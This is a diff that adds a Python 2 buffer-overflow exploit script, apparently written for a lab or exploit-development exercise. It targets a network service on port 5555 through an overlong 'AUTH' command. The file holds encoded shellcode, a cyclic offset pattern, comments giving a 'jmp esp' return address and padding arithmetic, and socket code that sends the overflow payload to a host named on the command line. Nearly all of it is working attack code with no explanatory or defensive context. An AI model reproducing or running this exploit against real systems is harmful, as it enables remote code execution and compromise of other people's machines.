@@ -1,0 +1,56 @@
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+
+
+shellcode = ("\xd9\xcc\xd9\x74\x24\xf4\xb8\xf7\x4a\x9a\xf9\x5a\x33\xc9\xb1"
+"\x52\x31\x42\x17\x83\xc2\x04\x03\xb5\x59\x78\x0c\xc5\xb6\xfe"
+"\xef\x35\x47\x9f\x66\xd0\x76\x9f\x1d\x91\x29\x2f\x55\xf7\xc5"
+"\xc4\x3b\xe3\x5e\xa8\x93\x04\xd6\x07\xc2\x2b\xe7\x34\x36\x2a"
+"\x6b\x47\x6b\x8c\x52\x88\x7e\xcd\x93\xf5\x73\x9f\x4c\x71\x21"
+"\x0f\xf8\xcf\xfa\xa4\xb2\xde\x7a\x59\x02\xe0\xab\xcc\x18\xbb"
+"\x6b\xef\xcd\xb7\x25\xf7\x12\xfd\xfc\x8c\xe1\x89\xfe\x44\x38"
+"\x71\xac\xa9\xf4\x80\xac\xee\x33\x7b\xdb\x06\x40\x06\xdc\xdd"
+"\x3a\xdc\x69\xc5\x9d\x97\xca\x21\x1f\x7b\x8c\xa2\x13\x30\xda"
+"\xec\x37\xc7\x0f\x87\x4c\x4c\xae\x47\xc5\x16\x95\x43\x8d\xcd"
+"\xb4\xd2\x6b\xa3\xc9\x04\xd4\x1c\x6c\x4f\xf9\x49\x1d\x12\x96"
+"\xbe\x2c\xac\x66\xa9\x27\xdf\x54\x76\x9c\x77\xd5\xff\x3a\x80"
+"\x1a\x2a\xfa\x1e\xe5\xd5\xfb\x37\x22\x81\xab\x2f\x83\xaa\x27"
+"\xaf\x2c\x7f\xe7\xff\x82\xd0\x48\xaf\x62\x81\x20\xa5\x6c\xfe"
+"\x51\xc6\xa6\x97\xf8\x3d\x21\x92\xf7\x3d\x1d\xca\x05\x3d\x5c"
+"\xb0\x83\xdb\x34\xd6\xc5\x74\xa1\x4f\x4c\x0e\x50\x8f\x5a\x6b"
+"\x52\x1b\x69\x8c\x1d\xec\x04\x9e\xca\x1c\x53\xfc\x5d\x22\x49"
+"\x68\x01\xb1\x16\x68\x4c\xaa\x80\x3f\x19\x1c\xd9\xd5\xb7\x07"
+"\x73\xcb\x45\xd1\xbc\x4f\x92\x22\x42\x4e\x57\x1e\x60\x40\xa1"
+"\x9f\x2c\x34\x7d\xf6\xfa\xe2\x3b\xa0\x4c\x5c\x92\x1f\x07\x08"
+"\x63\x6c\x98\x4e\x6c\xb9\x6e\xae\xdd\x14\x37\xd1\xd2\xf0\xbf"
+"\xaa\x0e\x61\x3f\x61\x8b\x91\x0a\x2b\xba\x39\xd3\xbe\xfe\x27"
+"\xe4\x15\x3c\x5e\x67\x9f\xbd\xa5\x77\xea\xb8\xe2\x3f\x07\xb1"
+"\x7b\xaa\x27\x66\x7b\xff")
+	
+pattern = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2B")
+
+
+# #65d11d71 jmp esp
+# #"\x41"*1040 + "\xfd\xff\x67\x77" + '\x90' * 16 + shellcode + "\x43"*(1425-1040-4-351-16)
+# # "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*(1425-1040-4)
+# # + '\x90' * 16 + shellcode minus 351-16
+
+try:
+    server = sys.argv[1]
+    port = 5555
+except IndexError:
+    print "[+] Usage %s host" % sys.argv[0]
+    sys.exit()
+
+req1 = "AUTH " + "A"*1040 + "\x71\x1d\xd1\x65" + "\x90" * 16 + shellcode + "C"*(379-351-16)
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try:
+     s.connect((server, port))
+     print repr(s.recv(1024))
+     s.send(req1)
+     print repr(s.recv(1024))
+except:
+     print "[!] connection refused, check debugger"
+s.close()
